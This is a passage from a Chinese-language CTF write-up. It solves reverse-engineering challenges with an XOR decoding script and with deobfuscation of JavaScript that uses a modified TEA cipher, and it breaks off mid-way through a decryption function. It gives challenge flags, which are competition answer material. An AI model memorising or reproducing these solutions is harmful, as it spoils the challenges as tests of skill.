<p>​	第三部分”The Power of Reverse”就是异或了<code>0x5E</code>，即字符<code>^</code></p>
<p>​	同样的，写个小脚本就好：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">56</span>,<span class="number">110</span>,<span class="number">108</span>,<span class="number">29</span>,<span class="number">59</span>,<span class="number">35</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    c = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(<span class="string">&#x27;^&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(c,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># f02Ce&#125;</span></span><br></pre></td></tr></table></figure>

<p>​	拼接一下得到flag为<code>XAUTCTF&#123;7hr3e_PHaZE_f02Ce&#125;</code></p>
<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>BR</br><br><b style="color:cyan;">	难度: </b>中等</br></p>
<p>​	BR在学习爬虫，这一天他被一个网站的js代码所难住了。</p>
<p>​	这个网站可以获取到flag，但是flag被加密了！</p>
<p>​	不懂reverse的BR反手就把这个问题丢给了你！</p>
<p>​	你看着眼前的js代码和密文陷入了沉思……	</p>
<p><strong>题解</strong></p>
<p>​	题目给出的附件是一个经过简单混淆的javascript代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Encrypt</span>(<span class="params">_0x4876d5, _0x38d487</span>) &#123; <span class="keyword">let</span> _0x2613c2 = <span class="title function_">keyToUint32Array</span>(_0x38d487); <span class="keyword">let</span> _0x3b1e6c = <span class="title function_">stringToUint32Array</span>(_0x4876d5); <span class="keyword">let</span> _0x3a6497 = _0x3b1e6c[<span class="string">&#x27;length&#x27;</span>]; <span class="keyword">const</span> _0x4d860d = <span class="number">0x9e3779b9</span>; <span class="keyword">let</span> _0x17d9bd = <span class="number">0x0</span>; <span class="keyword">for</span> (<span class="keyword">let</span> _0x2cf0ab = <span class="number">0x0</span>; _0x2cf0ab &lt; <span class="number">0x20</span>; _0x2cf0ab++) &#123; _0x17d9bd = _0x17d9bd + _0x4d860d &gt;&gt;&gt; <span class="number">0x0</span>; <span class="keyword">for</span> (<span class="keyword">let</span> _0x198235 = <span class="number">0x0</span>; _0x198235 &lt; _0x3a6497; _0x198235 += <span class="number">0x2</span>) &#123; _0x3b1e6c[_0x198235] = _0x3b1e6c[_0x198235] + ((_0x3b1e6c[_0x198235 + <span class="number">0x1</span>] &lt;&lt; <span class="number">0x4</span>) + _0x2613c2[<span class="number">0x0</span>] ^ _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] - _0x17d9bd ^ (_0x3b1e6c[_0x198235 + <span class="number">0x1</span>] &gt;&gt;&gt; <span class="number">0x5</span>) + _0x2613c2[<span class="number">0x1</span>]) &gt;&gt;&gt; <span class="number">0x0</span>; _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] = _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] + ((_0x3b1e6c[_0x198235] &lt;&lt; <span class="number">0x4</span>) + _0x2613c2[<span class="number">0x2</span>] ^ _0x3b1e6c[_0x198235] - _0x17d9bd ^ (_0x3b1e6c[_0x198235] &gt;&gt;&gt; <span class="number">0x5</span>) + _0x2613c2[<span class="number">0x3</span>]) &gt;&gt;&gt; <span class="number">0x0</span>; &#125; &#125; <span class="keyword">return</span> <span class="title function_">uint32ArrayToBase64</span>(_0x3b1e6c); &#125; <span class="keyword">function</span> <span class="title function_">stringToUint32Array</span>(<span class="params">_0x5f4e70</span>) &#123; <span class="keyword">let</span> _0x768fff = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>((_0x5f4e70[<span class="string">&#x27;length&#x27;</span>] + <span class="number">0x3</span> &amp; ~<span class="number">0x3</span>) * <span class="number">0x4</span>); <span class="keyword">let</span> _0x34c80a = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x768fff); <span class="keyword">for</span> (<span class="keyword">let</span> _0x53d00e = <span class="number">0x0</span>; _0x53d00e &lt; _0x5f4e70[<span class="string">&#x27;length&#x27;</span>]; _0x53d00e++) &#123; _0x34c80a[_0x53d00e] = _0x5f4e70[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x53d00e); &#125; <span class="keyword">let</span> _0x120412 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x768fff); <span class="keyword">return</span> <span class="title class_">Array</span>[<span class="string">&#x27;from&#x27;</span>](_0x120412); &#125; <span class="keyword">function</span> <span class="title function_">uint32ArrayToString</span>(<span class="params">_0x1e70bb</span>) &#123; <span class="keyword">let</span> _0x573d6d = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(_0x1e70bb[<span class="string">&#x27;length&#x27;</span>] * <span class="number">0x4</span>); <span class="keyword">let</span> _0x46894d = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x573d6d); _0x46894d[<span class="string">&#x27;set&#x27;</span>](_0x1e70bb); <span class="keyword">return</span> <span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](...<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x573d6d))[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\0+$/</span>, <span class="string">&#x27;&#x27;</span>); &#125; <span class="keyword">function</span> <span class="title function_">keyToUint32Array</span>(<span class="params">_0x549d83</span>) &#123; <span class="keyword">let</span> _0x4b1c55 = _0x549d83[<span class="string">&#x27;padEnd&#x27;</span>](<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)[<span class="string">&#x27;slice&#x27;</span>](<span class="number">0x0</span>, <span class="number">0x10</span>); <span class="keyword">return</span> <span class="title function_">stringToUint32Array</span>(_0x4b1c55); &#125; <span class="keyword">function</span> <span class="title function_">uint32ArrayToBase64</span>(<span class="params">_0x39ebd</span>) &#123; <span class="keyword">let</span> _0x1e90f8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(_0x39ebd[<span class="string">&#x27;length&#x27;</span>] * <span class="number">0x4</span>); <span class="keyword">let</span> _0x3fd077 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x1e90f8); _0x3fd077[<span class="string">&#x27;set&#x27;</span>](_0x39ebd); <span class="keyword">return</span> <span class="title function_">btoa</span>(<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](...<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x1e90f8))); &#125; <span class="keyword">function</span> <span class="title function_">base64ToUint32Array</span>(<span class="params">_0x581683</span>) &#123; <span class="keyword">let</span> _0x134468 = <span class="title function_">atob</span>(_0x581683); <span class="keyword">let</span> _0x477fb6 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(_0x134468[<span class="string">&#x27;length&#x27;</span>]); <span class="keyword">let</span> _0x39a17a = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x477fb6); <span class="keyword">for</span> (<span class="keyword">let</span> _0x4b9cde = <span class="number">0x0</span>; _0x4b9cde &lt; _0x134468[<span class="string">&#x27;length&#x27;</span>]; _0x4b9cde++) &#123; _0x39a17a[_0x4b9cde] = _0x134468[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x4b9cde); &#125; <span class="keyword">let</span> _0x178fce = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x477fb6); <span class="keyword">return</span> <span class="title class_">Array</span>[<span class="string">&#x27;from&#x27;</span>](_0x178fce); &#125; <span class="keyword">const</span> key = <span class="string">&#x27;XAUTCTF6666666BR&#x27;</span>; <span class="keyword">const</span> plaintext = <span class="string">&#x27;XAUTCTF&#123;this_is_a_sample&#125;&#x27;</span>; <span class="keyword">const</span> encrypted = <span class="title class_">Encrypt</span>(plaintext, key); <span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;加密结果:&#x27;</span>, encrypted);</span><br></pre></td></tr></table></figure>

<p>​	简单格式化处理一下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Encrypt</span>(<span class="params">_0x4876d5, _0x38d487</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> _0x2613c2 = <span class="title function_">keyToUint32Array</span>(_0x38d487);</span><br><span class="line">    <span class="keyword">let</span> _0x3b1e6c = <span class="title function_">stringToUint32Array</span>(_0x4876d5);</span><br><span class="line">    <span class="keyword">let</span> _0x3a6497 = _0x3b1e6c[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">    <span class="keyword">const</span> _0x4d860d = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">let</span> _0x17d9bd = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> _0x2cf0ab = <span class="number">0x0</span>; _0x2cf0ab &lt; <span class="number">0x20</span>; _0x2cf0ab++) &#123;</span><br><span class="line">        _0x17d9bd = _0x17d9bd + _0x4d860d &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> _0x198235 = <span class="number">0x0</span>; _0x198235 &lt; _0x3a6497; _0x198235 += <span class="number">0x2</span>) &#123;</span><br><span class="line">            _0x3b1e6c[_0x198235] = _0x3b1e6c[_0x198235] + ((_0x3b1e6c[_0x198235 + <span class="number">0x1</span>] &lt;&lt; <span class="number">0x4</span>) + _0x2613c2[<span class="number">0x0</span>] ^ _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] - _0x17d9bd ^ (_0x3b1e6c[_0x198235 + <span class="number">0x1</span>] &gt;&gt;&gt; <span class="number">0x5</span>) + _0x2613c2[<span class="number">0x1</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">            _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] = _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] + ((_0x3b1e6c[_0x198235] &lt;&lt; <span class="number">0x4</span>) + _0x2613c2[<span class="number">0x2</span>] ^ _0x3b1e6c[_0x198235] - _0x17d9bd ^ (_0x3b1e6c[_0x198235] &gt;&gt;&gt; <span class="number">0x5</span>) + _0x2613c2[<span class="number">0x3</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">uint32ArrayToBase64</span>(_0x3b1e6c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToUint32Array</span>(<span class="params">_0x5f4e70</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> _0x768fff = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>((_0x5f4e70[<span class="string">&#x27;length&#x27;</span>] + <span class="number">0x3</span> &amp; ~<span class="number">0x3</span>) * <span class="number">0x4</span>);</span><br><span class="line">    <span class="keyword">let</span> _0x34c80a = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x768fff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> _0x53d00e = <span class="number">0x0</span>; _0x53d00e &lt; _0x5f4e70[<span class="string">&#x27;length&#x27;</span>]; _0x53d00e++) &#123;</span><br><span class="line">        _0x34c80a[_0x53d00e] = _0x5f4e70[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x53d00e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> _0x120412 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x768fff);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Array</span>[<span class="string">&#x27;from&#x27;</span>](_0x120412);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">uint32ArrayToString</span>(<span class="params">_0x1e70bb</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> _0x573d6d = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(_0x1e70bb[<span class="string">&#x27;length&#x27;</span>] * <span class="number">0x4</span>);</span><br><span class="line">    <span class="keyword">let</span> _0x46894d = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x573d6d);</span><br><span class="line">    _0x46894d[<span class="string">&#x27;set&#x27;</span>](_0x1e70bb);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](...<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x573d6d))[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\0+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">keyToUint32Array</span>(<span class="params">_0x549d83</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> _0x4b1c55 = _0x549d83[<span class="string">&#x27;padEnd&#x27;</span>](<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)[<span class="string">&#x27;slice&#x27;</span>](<span class="number">0x0</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">stringToUint32Array</span>(_0x4b1c55);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">uint32ArrayToBase64</span>(<span class="params">_0x39ebd</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> _0x1e90f8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(_0x39ebd[<span class="string">&#x27;length&#x27;</span>] * <span class="number">0x4</span>);</span><br><span class="line">    <span class="keyword">let</span> _0x3fd077 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x1e90f8);</span><br><span class="line">    _0x3fd077[<span class="string">&#x27;set&#x27;</span>](_0x39ebd); <span class="keyword">return</span> <span class="title function_">btoa</span>(<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](...<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x1e90f8)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToUint32Array</span>(<span class="params">_0x581683</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> _0x134468 = <span class="title function_">atob</span>(_0x581683);</span><br><span class="line">    <span class="keyword">let</span> _0x477fb6 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(_0x134468[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">    <span class="keyword">let</span> _0x39a17a = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(_0x477fb6);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> _0x4b9cde = <span class="number">0x0</span>; _0x4b9cde &lt; _0x134468[<span class="string">&#x27;length&#x27;</span>]; _0x4b9cde++) &#123;</span><br><span class="line">        _0x39a17a[_0x4b9cde] = _0x134468[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x4b9cde);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> _0x178fce = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(_0x477fb6);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Array</span>[<span class="string">&#x27;from&#x27;</span>](_0x178fce);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> key = <span class="string">&#x27;XAUTCTF6666666BR&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> plaintext = <span class="string">&#x27;XAUTCTF&#123;this_is_a_sample&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> encrypted = <span class="title class_">Encrypt</span>(plaintext, key);</span><br><span class="line"><span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;加密结果:&#x27;</span>, encrypted);</span><br></pre></td></tr></table></figure>

<p>​	只是重命名混淆了下变量名，我们主要看看Encrypt这个函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Encrypt</span>(<span class="params">_0x4876d5, _0x38d487</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> _0x2613c2 = <span class="title function_">keyToUint32Array</span>(_0x38d487);</span><br><span class="line">    <span class="keyword">let</span> _0x3b1e6c = <span class="title function_">stringToUint32Array</span>(_0x4876d5);</span><br><span class="line">    <span class="keyword">let</span> _0x3a6497 = _0x3b1e6c[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">    <span class="keyword">const</span> _0x4d860d = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">let</span> _0x17d9bd = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> _0x2cf0ab = <span class="number">0x0</span>; _0x2cf0ab &lt; <span class="number">0x20</span>; _0x2cf0ab++) &#123;</span><br><span class="line">        _0x17d9bd = _0x17d9bd + _0x4d860d &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> _0x198235 = <span class="number">0x0</span>; _0x198235 &lt; _0x3a6497; _0x198235 += <span class="number">0x2</span>) &#123;</span><br><span class="line">            _0x3b1e6c[_0x198235] = _0x3b1e6c[_0x198235] + ((_0x3b1e6c[_0x198235 + <span class="number">0x1</span>] &lt;&lt; <span class="number">0x4</span>) + _0x2613c2[<span class="number">0x0</span>] ^ _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] - _0x17d9bd ^ (_0x3b1e6c[_0x198235 + <span class="number">0x1</span>] &gt;&gt;&gt; <span class="number">0x5</span>) + _0x2613c2[<span class="number">0x1</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">            _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] = _0x3b1e6c[_0x198235 + <span class="number">0x1</span>] + ((_0x3b1e6c[_0x198235] &lt;&lt; <span class="number">0x4</span>) + _0x2613c2[<span class="number">0x2</span>] ^ _0x3b1e6c[_0x198235] - _0x17d9bd ^ (_0x3b1e6c[_0x198235] &gt;&gt;&gt; <span class="number">0x5</span>) + _0x2613c2[<span class="number">0x3</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">uint32ArrayToBase64</span>(_0x3b1e6c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	根据函数调用来看，不难看出<code>_0x4876d5</code>代表<code>plaintext</code>，<code>_0x38d487</code>代表<code>key</code>，<code>_0x2cf0ab</code>和<code>_0x198235</code>显然是循环变量，用<code>i</code>和<code>j</code>代替，<code>_0x2613c2</code>是由key转化来的数组，用<code>k</code>代替，<code>_0x3b1e6c</code>是由<code>_0x4876d5</code>转化来的数组，用<code>v</code>代替，<code>_0x17d9bd</code>是一个在循环中不断累加的变量，记作<code>num</code>，<code>_0x4d860d</code>则是个常量，就记作<code>e</code>，<code>_0x3a6497</code>是<code>plaintext</code>的长度，就用<code>length</code>表示，替换得到：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> k = <span class="title function_">keyToUint32Array</span>(key);</span><br><span class="line">    <span class="keyword">let</span> v = <span class="title function_">stringToUint32Array</span>(plaintext);</span><br><span class="line">    <span class="keyword">let</span> length = v[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">    <span class="keyword">const</span> e = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">let</span> num = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        num = num + e &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x0</span>; j &lt; length; j += <span class="number">0x2</span>) &#123;</span><br><span class="line">            v[j] = v[j] + ((v[j + <span class="number">0x1</span>] &lt;&lt; <span class="number">0x4</span>) + k[<span class="number">0x0</span>] ^ v[j + <span class="number">0x1</span>] - num ^ (v[j + <span class="number">0x1</span>] &gt;&gt;&gt; <span class="number">0x5</span>) + k[<span class="number">0x1</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">            v[j + <span class="number">0x1</span>] = v[j + <span class="number">0x1</span>] + ((v[j] &lt;&lt; <span class="number">0x4</span>) + k[<span class="number">0x2</span>] ^ v[j] - num ^ (v[j] &gt;&gt;&gt; <span class="number">0x5</span>) + k[<span class="number">0x3</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">uint32ArrayToBase64</span>(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	存在明显特征，就是一个有略微修改的tea加密算法，可参考学习<a target="_blank" rel="noopener" href="https://blog.csdn.net/liKeQing1027520/article/details/141287289">tea 加密解密算法（面向ctf-reverse使用，光速学会tea逆向套路）_tea加密-CSDN博客</a></p>
<p>​	经典的tea加密应该这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v[j] = v[j] + ((v[j + <span class="number">0x1</span>] &lt;&lt; <span class="number">0x4</span>) + k[<span class="number">0x0</span>] ^ v[j + <span class="number">0x1</span>] + num ^ (v[j + <span class="number">0x1</span>] &gt;&gt;&gt; <span class="number">0x5</span>) + k[<span class="number">0x1</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">v[j + <span class="number">0x1</span>] = v[j + <span class="number">0x1</span>] + ((v[j] &lt;&lt; <span class="number">0x4</span>) + k[<span class="number">0x2</span>] ^ v[j] + num ^ (v[j] &gt;&gt;&gt; <span class="number">0x5</span>) + k[<span class="number">0x3</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br></pre></td></tr></table></figure>

<p>​	本题将加改为减，变成：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v[j] = v[j] + ((v[j + <span class="number">0x1</span>] &lt;&lt; <span class="number">0x4</span>) + k[<span class="number">0x0</span>] ^ v[j + <span class="number">0x1</span>] - num ^ (v[j + <span class="number">0x1</span>] &gt;&gt;&gt; <span class="number">0x5</span>) + k[<span class="number">0x1</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br><span class="line">v[j + <span class="number">0x1</span>] = v[j + <span class="number">0x1</span>] + ((v[j] &lt;&lt; <span class="number">0x4</span>) + k[<span class="number">0x2</span>] ^ v[j] - num ^ (v[j] &gt;&gt;&gt; <span class="number">0x5</span>) + k[<span class="number">0x3</span>]) &gt;&gt;&gt; <span class="number">0x0</span>;</span><br></pre></td></tr></table></figure>

<p>​	这样的形式还是不太好看出来，可以再换一下形式，看着更顺眼些了：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> k = <span class="title function_">keyToUint32Array</span>(key);</span><br><span class="line">    <span class="keyword">let</span> v = <span class="title function_">stringToUint32Array</span>(plaintext);</span><br><span class="line">    <span class="keyword">let</span> n = v.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum = (sum + delta) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j += <span class="number">2</span>) &#123;</span><br><span class="line">            v[j] = (v[j] + (((v[j + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v[j + <span class="number">1</span>] - sum) ^ ((v[j + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">            v[j + <span class="number">1</span>] = (v[j + <span class="number">1</span>] + (((v[j] &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v[j] - sum) ^ ((v[j] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">uint32ArrayToBase64</span>(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	对应解密算法为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Dncrypt</span>(<span class="params">ciphertext, key</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> k = <span class="title function_">keyToUint32Array</span>(key);</span><br><span class="line">    <span class="keyword">let</span> v = <span class="title function_">base64ToUint32Array</span>(ciphertext);</span><br><span class="line">    <span class="keyword">let</span> n = v.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = (delta * <span class="number">32</span>) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = n - <span class="number">2</span>; j &gt;= <span class="number">0</span>; j -= <span class="number">2</span>) &#123;</span><br><span class="line">            v[j + <span class="number">1</span>] = (v[j + <span class="number">1</span>] - (((v[j] &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v[j] - sum) ^ ((v[j] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">            v[j] = (v[j] - (((v[j + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + k[<span 